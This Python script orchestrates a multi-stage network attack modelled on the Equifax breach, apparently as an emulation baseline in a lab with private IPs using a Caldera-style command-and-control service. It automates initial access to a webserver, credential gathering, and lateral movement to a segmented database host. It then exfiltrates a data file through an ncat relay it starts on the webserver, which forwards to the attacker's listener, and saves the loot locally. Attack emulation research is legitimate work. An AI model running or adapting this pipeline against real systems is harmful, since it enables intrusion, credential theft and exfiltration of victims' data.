import datetime
import pathlib
import shutil
from dotenv import load_dotenv

load_dotenv()

from incalmo.core.models import Host
from incalmo.core.services import EnvironmentStateService, CncService
from incalmo.core.agents.find_info_agent import FindInfoAgent
from incalmo.core.agents.lateral_move_agent import LateralMoveAgent
from incalmo.core.agents.exfiltrate_agent import ExfiltrateAgent
from incalmo.core.services.attack_graph_service import AttackGraphService
from incalmo.core.strategy.route_planner import resolve_attack_route, resolve_exfil_route

# ==========================================================
# Global Constants: Logical roles mapped to actual IPs
# ==========================================================
ROLE_MAP = {
    "webserver": "10.0.0.2",
    "database": "192.168.1.100"
}
LOOT_PATH = "/home/database/data.json"

# Network topology definition (used only for initial environment state configuration)
EXTNET = "10.0.0.0/24"        # attacker <-> webserver
INTNET = "192.168.1.0/24"     # webserver <-> database ONLY (no egress)

# Webserver's intnet-facing IP: the only address the DB can reach on the external pivot.
# Used to route the ncat exfil relay so DB can push data out through the web bridge.
WEB_INTNET_IP = "192.168.1.2"
EXFIL_RELAY_PORT = 9001        # ncat relay port on webserver (intnet side)


def _credential_for(env, target_ip):
    """
    Select a discovered credential that can log into target_ip.
    """
    creds = env.get_credentials()
    for c in creds:
        if target_ip in getattr(c, "can_access_hosts", []):
            return c
    return creds[0] if creds else None


def run_equifax_baseline():
    """
    Graph-driven, decoupled baseline that dynamically resolves paths 
    instead of hardcoding the execution order.
    """
    attacker_ip = "10.0.0.50"
    env = EnvironmentStateService(attacker_ip=attacker_ip)
    cnc = CncService()  # Reads CALDERA_API_KEY from environment

    # 1. Seed topology injection to make the graph aware of the network layout
    env.add_initial_subnet(EXTNET, is_external=True)
    env.add_initial_subnet(INTNET, is_external=False)
    
    env.add_host(Host(ip=ROLE_MAP["webserver"], is_external=True))
    env.add_host_to_subnet(ROLE_MAP["webserver"], EXTNET)
    env.add_host_to_subnet(ROLE_MAP["webserver"], INTNET)
    
    env.add_host(Host(ip=ROLE_MAP["database"], is_external=False))
    env.add_host_to_subnet(ROLE_MAP["database"], INTNET)

    # Initialize graph services and agents
    graph = AttackGraphService(env)
    lateral = LateralMoveAgent(env, cnc)
    findinfo = FindInfoAgent(env)
    exfiltrate = ExfiltrateAgent(env)

    runners = {}  # Map controlled host IPs to their C&C runner instances

    print("[*] Graph-driven Equifax baseline execution started...")

    # ================= Dynamic Lateral Movement Stage =================
    target_db_ip = ROLE_MAP["database"]

    # Keep expanding footholds until we control the database.
    # Each successful compromise updates env state, so the graph
    # automatically opens up new paths on the next round.
    while target_db_ip not in runners:
        before = len(runners)

        # Ask for a route to the DB; if it's unreachable right now,
        # fall back to taking the pivot (web) first to open the path.
        attack_hops = resolve_attack_route(graph, target_db_ip)
        if not attack_hops:
            attack_hops = resolve_attack_route(graph, ROLE_MAP["webserver"])
        if not attack_hops:
            print("[-] Error: No reachable target — stuck, need more recon.")
            return

        print("[CHECK] attack_hops =", attack_hops)

        for pivot_from, target in attack_hops:
            # Skip hops we already control
            if target in runners:
                continue

            print(f"[*] Orchestrating hop: From {pivot_from} -> Target: {target}")

            # State-based decision: initial exploit vs credential-based pivot
            if target == ROLE_MAP["webserver"] and not env.get_credentials():
                # Initial access phase
                runners[target] = lateral.run(target)["data"]["runner"]
                print(f"[+] Successfully established initial access on: {target}")

                # Post-compromise discovery: gather credentials to update env state
                print(f"[*] Gathering subsequent access credentials from {target}...")
                findinfo.run(runners[target], found_on_host=target)
            else:
                # Pivot phase: use credentials collected from previous steps.
                # Pass the pivot host's runner so lateral move can SSH through it
                # rather than reaching the target directly from the attacker
                # (required in segmented network where attacker can't reach intnet).
                hop_cred = _credential_for(env, target)
                pivot_runner = runners.get(pivot_from)
                runners[target] = lateral.run(
                    target, credential=hop_cred, pivot_runner=pivot_runner
                )["data"]["runner"]
                print(f"[+] Successfully completed lateral move to: {target}")

        # Safety: if a full round added no new host, stop instead of looping forever
        if len(runners) == before:
            print("[-] Error: A full round made no progress — aborting.")
            return

    print("[+] Database compromised — lateral movement complete.")

    # ================= Dynamic Data Exfiltration Stage =================
    print("[*] Lateral movement complete. Initiating dynamic data exfiltration...")

    exfil_route = resolve_exfil_route(graph, target_db_ip)
    print("[CHECK] exfil_route =", exfil_route)

    home_path = " -> ".join([target_db_ip] + [dst for _, dst in exfil_route])
    print(f"[*] Dynamically calculated exfiltration relay path: {home_path}")

    # Multi-hop exfil: if the path has intermediate hops the DB cannot reach the
    # attacker directly (segmented network, intnet has no egress).  Start an ncat
    # TCP relay on the webserver so DB can push through the web bridge.
    if len(exfil_route) > 1:
        web_runner = runners[ROLE_MAP["webserver"]]
        relay_cmd = (
            f"nohup ncat -l -p {EXFIL_RELAY_PORT} "
            f"--sh-exec 'ncat {attacker_ip} 9000' "
            f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
        )
        print(f"[*] Starting exfil relay on webserver "
              f"({WEB_INTNET_IP}:{EXFIL_RELAY_PORT}) -> attacker ({attacker_ip}:9000)...")
        web_runner.run(relay_cmd)
        exfil_url = f"http://{WEB_INTNET_IP}:{EXFIL_RELAY_PORT}/upload"
    else:
        exfil_url = "http://host.docker.internal:9000/upload"

    result = exfiltrate.run(runners[target_db_ip], LOOT_PATH, receiver_url=exfil_url)
    print(f"[+] Exfiltration complete: {result['message']}")

    # ================= Loot Preservation =================
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    out_dir = pathlib.Path(__file__).resolve().parents[3] / "output" / stamp
    out_dir.mkdir(parents=True, exist_ok=True)
    
    saved_path = result["data"]["saved_to"]
    shutil.copy(saved_path, out_dir / "data.json")

    print(f"[*] Compromised hosts list = {[h.ip for h in env.get_compromised_hosts()]}")
    print(f"[*] Output artifacts successfully saved to: {out_dir / 'data.json'}")


if __name__ == "__main__":
    run_equifax_baseline()